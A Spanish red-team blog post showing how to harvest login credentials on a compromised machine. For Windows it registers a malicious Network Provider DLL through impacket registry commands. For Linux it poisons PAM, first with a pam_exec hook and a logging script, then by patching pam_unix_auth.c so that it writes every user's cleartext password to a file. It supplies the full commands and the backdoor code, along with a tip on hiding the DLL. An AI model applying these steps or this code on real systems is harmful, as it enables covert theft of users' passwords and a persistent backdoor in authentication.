---
layout: post2
language: es
title:  "Cosechando Credenciales"
categories:  es Credenciales
tags: [ "Red Team", "Credenciales", "Escalada"]
---

## Índice
---
1. [Network Providers (Windows)](#network-providers-windows)
2. [Envenenamiento de PAM (Linux)](#envenenamiento-de-pam-linux)
	1. [Añadiendo script al common-auth](#añadiendo-script-al-common-auth)
	2. [Sustituyendo la librería por una modificada](#sustituyendo-la-librería-por-una-modificada)

---

# Introducción

En ocasiones podemos tener una cuenta que es administrador local de una maquina, pero no disponga de mas permisos sobre el dominio, por ejemplo, o necesitemos las credenciales de una cuenta en concreto. Con la cuenta administrador podemos obtener credenciales de los usuarios que logueen en dicha maquina mediante una técnica que consiste en envenenar el proceso de login de una maquina, ya que al iniciar sesión el usuario introduce sus credenciales, es por esto que envenenando este proceso se podría obtener credenciales. Esto puede hacerse tanto en Windows como en Linux, obviamente al ser procesos de autenticación y sistemas  diferentes el proceso también será diferente

En Windows se utilizara los *Networks Providers* mientras que en linux, si la autenticación es mediante (PAM) se envenenará el proceso para obtener las credenciales que se introduzcan en dicho proceso.

<b><i>Para ambos caso se necesita permisos de administrador sobre la maquina, ya que hay modificar el proceso de autenticaciónn de la misma</i></b>
<br>

---

## Netwok Providers (Windows)

El proceso de autenticación de Windows se hace mediante *Windlogon*, el cual, proporciona una interfaz gráfica y la función de autenticación

*Network Provider* es una DLL utilizado sobre todo para facilitar las comunicaciones de red, interactuando con la API, su modificación pude ser utilizada para obtener las credenciales de los usuarios que se conecten a la maquina, ya que se utiliza en el proceso de autenticación.

Para ello se debe modificar la dll, un ejemplo de esta modificación podría ser [esta](https://github.com/alhkytran/networkprovider.c). La cual esta basada en la que podemos encontrar en [NPPspy](https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy)

En nuestro ejemplo tenemos tenemos una cuenta de usuario sin privilegios dentro del dominio llamada `mokete` comprometida, este usuario es administrador local de la maquina *Windows10*, necesitamos privilegios de administrador para realizar modificaciones de del registro de la maquina.

<p align="center">
   <img src="/assets/img/mokete1.png">
</p>

<p align="center">
   <img src="/assets/img/mokete2.png">
</p>

<p align="center">
   <img src="/assets/img/mokete_smb.png">
</p>

Primero deberemos subir el fichero, en este caso lo realizamos en una carpeta controlada, pero podría ser en una del sistema para pasar mas desapercibido y con un nombre menos sospechoso, en este caso es indiferente, lo subimos en *C:\\Users\\Public\\Downloads\\* con el nombre de *NetworkProvider.dll*

<p align="center">
   <img src="/assets/img/NP-uploadfile.png">
</p>

Después usaremos, `reg.py` de *impacket* para modificar el registro de la maquina y hacer que cuando entre en el proceso de logueo utilice nuestra dll modificada.

## <b style="color:red">Importante</b>
`reg.py` tiene un fallo al escribir en el registro, aunque no da fallo no escribe de forma correcta, para solventar el fallo hay que modificar el archivo `rrp.py` como indica [aqui](https://github.com/fortra/impacket/pull/1295/commits/ef90107a3f733c428450ceb7f30f60ef1c9d54c6) una vez modificado el archivo como indica el link, deberá instalarse impacket nuevamente, para ello es recomendable el uso de `virutalenv` y utilizar `python3 setup.py install` de impacket.

<p align="center">
   <img src="/assets/img/NP-cambio-rrp.png">
</p>

<p align="center">
   <img src="/assets/img/NP-impa.png">
</p>


Tras arreglar impacket lo primero que debemos hacer es listar los Providers para evitar eliminar providers en uso.

```impacket
reg.py mokete@Windows10.brain.body query -keyName 'HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order'
```

<p align="center">
   <img src="/assets/img/NP-providers1.png">
</p>

Despues añadiremos *Veneno* dentro de los providers, sera el que intercepte las credenciales
```impacket
reg.py mokete@Windows10.brain.body add -keyName 'HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order' -v ProviderOrder -vt REG_SZ -vd "VBoxSF,RDPNP,LanmanWorkstation,WebClient,Veneno"
```

<p align="center">
   <img src="/assets/img/NP-providers2.png">
</p>

Después iremos creando la "ruta" dentro del *ControlSet* hasta que le indiquemos que dll deberá cargar
```impacket
reg.py mokete@Windows10.brain.body add -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\Veneno'
```

<p align="center">
   <img src="/assets/img/NP-providers3.png">
</p>

```impacket
reg.py smokete@Windows10.brain.body add -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\Veneno\NetworkProvider'
```
<p align="center">
   <img src="/assets/img/NP-providers4.png">
</p>

```impacket
reg.py mokete@Windows10.brain.body add  -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\Veneno\NetworkProvider' -v Class -vt REG_DWORD -vd 2
```

<p align="center">
   <img src="/assets/img/NP-providers5.png">
</p>

```impacket
reg.py mokete@Windows10.brain.body add  -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\Veneno\NetworkProvider' -v Name -vt REG_SZ -vd Veneno
```

<p align="center">
   <img src="/assets/img/NP-providers6.png">
</p>

Finalmente añadiremos la ruta de la dll en los registros creados con los comandos anteriores, de esta forma cargara nuestra dll en el proceso de autenticación.
```impacket
reg.py mokete@Windows10.brain.body add -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\Veneno\NetworkProvider' -v ProviderPath -vt REG_EXPAND_SZ -vd "C:\users\public\Downloads\NetworkProvider.dll"
```

<p align="center">
   <img src="/assets/img/NP-providers7.png">
</p>

Para comprobar su funcionamiento solo deberemos loguear en la maquina e ir a la ruta donde almacena las credenciales.

<p align="center">
   <img src="/assets/img/NP-providers_result1.png">
</p>


---
## Envenenamiento de PAM (Linux)
### Añadiendo script al common-auth
Una forma de obtener las credenciales seria como indican en el siguiente [post](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)

En este caso solo habría que crear un script que almacene el contenido de las variables `$PAM_USER` y `$(cat -)` lo que almacenará la contraseña

*Pluggable Authentication Modules* mas conocido como PAM, en linux, es utilizado para la gestión de autenticación de los usuarios.
```#!/bin/bassh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/archivopassword.log
```

<p align="center">
   <img src="/assets/img/NP-script.png">
</p>

Con `chmod +x` le daremos permisos de ejecución a ese archivo. Luego modificaremos el archivo `/etc/pam.d/common-auth` para añadir la siguiente  linea<br>
`auth optional pam_exec.so quiet expose_authtok RUTA_DEL_SCRIPT`

Después de esto cuando un usuario se autentique correctamente aparecerá en el log que hemos indicado
<p align="center">
   <img src="/assets/img/NP-PAM1.png">
</p>


### Sustituyendo la librería por una modificada
Otra forma de conseguir credenciales es de una forma mas similar a los network providers de Windows, podemos modificar las librerías utilizadas para gestionar las credenciales y envenenar el proceso de autenticación. En este caso, para su correcto funcionamiento, lo primero que debemos realizar es conocer la versión de pam, para modificar la librería, compilarla y sustituirla, en caso de no usar la misma versión , podría romperse la autenticación del servidor.

Para obtener la versión de PAM en el sistema operativo, podemos realizar, en las distribuciones basadas en debian, el comando <br>
`dpkg -s libpam0g`

<p align="center">
   <img src="/assets/img/NP-VersionPAM.png">
</p>

En distros centos o redhat el comando sería<br>
`rpm -q pam`

Una vez conocemos la versión de pam, podemos localizarla [aqui](https://github.com/linux-pam/linux-pam/releases) y la descargamos
<p align="center">
   <img src="/assets/img/NP-VersionPAM2.png">
</p>

Después debemos modificar el archivo `modules/pam_unix/pam_unix_auth.c` en mi caso voy  a crear un archivo en escritorio de mi usuario con las credenciales de toda la maquina en claro, para ello creare una funcion y añadire la llamada en el proceso de logueo
<br>

 ```c
         D(("user=%s, password=[%s]", name, p));
        retval = _unix_verify_password(pamh, name, p, ctrl);
        //llamada a la funcion creada
        savethings("/home/RUTA/Escritorio/pass.txt",name, p);
        name = p = NULL;


        AUTH_RETURN;
}


/*
Esta funcion guardará las credenciales en un archivo el archivo
 */

void savethings (const char* filename, const char* nombre, const char* passworr) {
    // Abre el archivo para escritura
    FILE *file = fopen(filename, "a");

    // Verifica si el archivo se abrió correctamente
    if (file == NULL) {
        perror("Error al abrir el archivo");
        return;
    }

    // Escribe el valor de la variable en el archivo
    fprintf(file, "Usuario: %s\nPassowrd:%s\n", nombre,passworr);

    // Cierra el archivo
    fclose(file);
}
```

<p align="center">
   <img src="/assets/img/NP-Code.png">
</p>

Con esto realizamos un configure y un make para generear las librerias nuevas modificadas, después solo tendremso que copiar la nueva librería `pam_unix.so`  en la ruta del original, lo suyo es hacer una copia de seguridad del original, por si hubiera que volver en algun momento
<br>
`cp /lib/x86_64-linux-gnu/security/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so.bk`

<br>
Y luego ya sustituimos la modificada <br>
`cp modules/pam_unix/.libs/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so`


<br>Desde ese momento siempre que alguien autentique se creara una entrada en el archivo indicado con las credenciales, como indica en la función creada

<p align="center">
   <img src="/assets/img/NP-miliki.png">
</p>


---

<br>
## References
- Netwok Providers
	- https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy
	- https://www.hackplayers.com/2022/08/passwords-en-claro-mediante-nplogonnotify.html 
	- https://github.com/MicrosoftDocs/win32/blob/docs/desktop-src/SecAuthN/implementing-a-network-provider.md
	- https://learn.microsoft.com/en-us/windows/win32/secauthn/network-providers

- PAM
	- https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/
	- https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9
	- https://x-c3ll.github.io/posts/PAM-backdoor-DNS/ 


## Agradecimientos
- [Mario Bartolome](https://github.com/MarioBartolome) - *Por la incansable ayuda e inspiración* 
- [Jorge Lajara](https://jlajara.gitlab.io/) y Guillermo  - *Me sacaron del pozo que era el problema con el rpp.py de impacket*
